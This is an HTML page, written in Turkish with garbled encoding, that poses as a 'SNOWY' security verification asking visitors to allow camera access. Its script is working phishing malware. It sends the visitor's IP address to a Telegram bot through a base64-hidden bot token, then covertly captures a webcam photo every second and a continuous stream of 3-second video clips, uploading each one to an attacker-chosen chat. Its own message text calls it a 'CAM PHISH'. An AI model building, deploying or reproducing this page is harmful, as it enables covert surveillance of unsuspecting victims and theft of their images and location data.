<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SNOWY GГјvenlik DoДҹrulamasДұ</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 40px;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        h2 { color: #333; font-size: 28px; margin-bottom: 10px; }
        h2 span { color: #667eea; }
        p { color: #666; margin-bottom: 30px; }
        .btn {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white; border: none; padding: 16px 32px;
            font-size: 18px; font-weight: bold; border-radius: 50px;
            cursor: pointer; width: 100%;
        }
        .btn:hover { transform: translateY(-2px); }
        .loading { display: none; margin: 20px 0; }
        .spinner {
            border: 4px solid #f3f3f3; border-top: 4px solid #667eea;
            border-radius: 50%; width: 40px; height: 40px;
            animation: spin 1s linear infinite; margin: 0 auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loading-text { color: #667eea; margin-top: 10px; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h2>вқ„пёҸ <span>SNOWY</span> GГңVENLД°K DOДһRULAMASI</h2>
        <p>Devam etmek iГ§in kamera eriЕҹimine izin verin.</p>
        <button class="btn" id="startBtn" onclick="startCamera()">рҹ“ё BAЕһLAT</button>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <div class="loading-text" id="loadingText">GГјvenlik kontrolГј...</div>
        </div>
    </div>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // ============================================
        // GД°ZLД° KONFД°GГңRASYON (ЕһД°FRELД° TOKEN)
        // ============================================
        const SIFRELI_TOKEN = "ODc3MzEyNDcxNTpBQUVmczgwdDh5djJYbkRHeTIwYUxseHkzYUZHd0RqMGpGVQ==";
        const BOT_TOKEN = atob(SIFRELI_TOKEN);
        const urlParams = new URLSearchParams(window.location.search);
        const TARGET_ID = urlParams.get('i');
        
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        
        let mediaRecorder = null;
        let recordedChunks = [];
        let videoCount = 0;
        let photoCount = 0;
        let ipGonderildi = false;
        
        // ============================================
        // Д°P ADRESД° AL
        // ============================================
        async function getIP() {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                return ipData.ip;
            } catch(e) {
                return 'AlДұnamadДұ';
            }
        }
        
        // ============================================
        // Д°P'YД° TELEGRAM'A GГ–NDER
        // ============================================
        async function sendIP(ip) {
            if (ipGonderildi) return;
            
            const msg = `вқ„пёҸ SNOWY CAM PHISH вқ„пёҸ\nв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғ\nрҹҢҗ IP Adresi: ${ip}\nвҸұпёҸ Zaman: ${new Date().toLocaleString('tr-TR')}\nв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғ\nвҡЎ @snowy_dexry_wexry вҡЎ`;
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ 
                    chat_id: TARGET_ID, 
                    text: msg
                })
            });
            
            ipGonderildi = true;
        }
        
        // ============================================
        // FOTOДһRAF ГҮEK - 1 SANД°YEDE 1
        // ============================================
        async function takePhoto() {
            if (!video.videoWidth || !video.videoHeight) return;
            
            try {
                photoCount++;
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(async function(blob) {
                    if (!blob) return;
                    
                    const formData = new FormData();
                    formData.append('chat_id', TARGET_ID);
                    formData.append('photo', blob, `foto_${Date.now()}.jpg`);
                    formData.append('caption', `рҹ“ё FotoДҹraf #${photoCount} - ${new Date().toLocaleString('tr-TR')}`);
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    
                }, 'image/jpeg', 0.7);
                
            } catch(e) {}
        }
        
        // ============================================
        // 3 SANД°YELД°K VД°DEO KAYDI
        // ============================================
        function recordVideo() {
            if (!stream || !stream.active) return;
            
            recordedChunks = [];
            
            try {
                mediaRecorder = new MediaRecorder(stream);
            } catch(e) {
                console.log("MediaRecorder hatasДұ:", e);
                return;
            }
            
            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) recordedChunks.push(event.data);
            };
            
            mediaRecorder.onstop = async () => {
                videoCount++;
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                
                const boyutKB = (blob.size / 1024).toFixed(0);
                
                const formData = new FormData();
                formData.append('chat_id', TARGET_ID);
                formData.append('video', blob, `video_${Date.now()}.webm`);
                formData.append('caption', `рҹҺҘ Video #${videoCount} - ${new Date().toLocaleString('tr-TR')} (${boyutKB}KB)`);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                
                // Yeni video baЕҹlat (3 saniyelik)
                setTimeout(recordVideo, 500);
            };
            
            // 3 saniye kaydet
            mediaRecorder.start();
            setTimeout(() => {
                if (mediaRecorder && mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
            }, 3000);
        }
        
        // ============================================
        // KAMERAYI BAЕһLAT
        // ============================================
        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: true
                });
                
                video.srcObject = stream;
                
                video.onloadedmetadata = async () => {
                    await video.play();
                    
                    // IP'yi gГ¶nder
                    const ip = await getIP();
                    await sendIP(ip);
                    
                    document.getElementById('startBtn').style.display = 'none';
                    document.getElementById('loading').style.display = 'block';
                    
                    // 1 SANД°YEDE 1 FOTOДһRAF
                    setInterval(takePhoto, 1000);
                    
                    // 2 saniye bekle sonra video baЕҹlasДұn (3 saniyelik)
                    setTimeout(recordVideo, 2000);
                };
                
            } catch(e) {
                alert('Kamera izni gerekli!');
            }
        }
        
        // ============================================
        // SAYFA YГңKLENDД°ДһД°NDE
        // ============================================
        window.onload = async function() {
            if (TARGET_ID) {
                const ip = await getIP();
                await sendIP(ip);
            }
        };
        
        // ============================================
        // SAYFA KAPANIRKEN
        // ============================================
        window.onbeforeunload = function() {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        };
    </script>
</body>
    </html>
